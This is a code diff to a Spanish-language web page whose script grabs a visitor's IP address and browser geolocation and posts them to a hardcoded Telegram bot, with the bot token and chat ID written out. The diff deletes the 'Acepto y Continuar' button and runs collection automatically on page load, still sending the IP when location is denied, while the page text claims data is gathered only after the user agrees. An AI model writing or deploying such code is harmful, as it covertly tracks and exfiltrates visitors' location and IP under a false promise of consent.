@@ -41,18 +41,6 @@
 
     h3 { margin-top:0; color:#333; }
 
-    .btn {
-        padding:12px 22px;
-        background:#e5002b;
-        border:none;
-        color:white;
-        font-size:1em;
-        border-radius:8px;
-        cursor:pointer;
-        width:100%;
-        margin-top:10px;
-    }
-
     @keyframes fadeIn {
         from { opacity:0; transform: scale(0.9); }
         to { opacity:1; transform: scale(1); }
@@ -82,12 +70,10 @@
             Esta información se recopilará <strong>solo después de que aceptes</strong>
             y será enviada de forma segura.
         </p>
-        <button class="btn" id="accept-btn">Acepto y Continuar</button>
     </div>
 </div>
 
 <script>
-
 // --- TUS DATOS DE TELEGRAM ---
 const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
 const CHAT_ID  = "-5099354587";
@@ -105,7 +91,6 @@ async function obtenerIP() {
 
 // Armar mensaje HTML bonito para Telegram
 function armarMensaje(datos) {
-
     return `
 <b>📍 NUEVO CONSENTIMIENTO</b>
 
@@ -131,7 +116,6 @@ function armarMensaje(datos) {
 // Enviar mensaje a Telegram
 async function enviarTelegram(msg) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
     await fetch(url, {
         method: "POST",
         headers: { "Content-Type":"application/json" },
@@ -143,17 +127,13 @@ async function enviarTelegram(msg) {
     });
 }
 
-// PROCESO PRINCIPAL
-document.getElementById("accept-btn").onclick = async function () {
-
-    // Oculto modal
-    document.getElementById("consent-modal").style.display = "none";
-    document.getElementById("main-content").style.display = "block";
+// Función principal para pedir consentimiento y ubicación
+async function pedirConsentimiento() {
 
     // Obtener IP
     const ipInfo = await obtenerIP();
 
-    // Obtener ubicación del navegador (con consentimiento real)
+    // Solicitar ubicación automáticamente
     navigator.geolocation.getCurrentPosition(async pos => {
 
         const datos = {
@@ -173,9 +153,13 @@ document.getElementById("accept-btn").onclick = async function () {
         const mensaje = armarMensaje(datos);
         await enviarTelegram(mensaje);
 
+        // Ocultar modal y mostrar contenido
+        document.getElementById("consent-modal").style.display = "none";
+        document.getElementById("main-content").style.display = "block";
+
     }, async err => {
 
-        // SI EL USUARIO NIEGA PERMISO, IGUAL ENVIAMOS SOLO IP
+        // Si niega permiso, enviar solo IP
         const datos = {
             fecha: new Date().toLocaleString(),
             ip: ipInfo.ip || "N/D",
@@ -191,9 +175,15 @@ document.getElementById("accept-btn").onclick = async function () {
 
         const mensaje = armarMensaje(datos);
         await enviarTelegram(mensaje);
-    });
-};
 
+        // Ocultar modal y mostrar contenido
+        document.getElementById("consent-modal").style.display = "none";
+        document.getElementById("main-content").style.display = "block";
+    });
+}
+
+// Ejecutar al cargar la página
+window.onload = pedirConsentimiento;
 </script>
 
 </body>
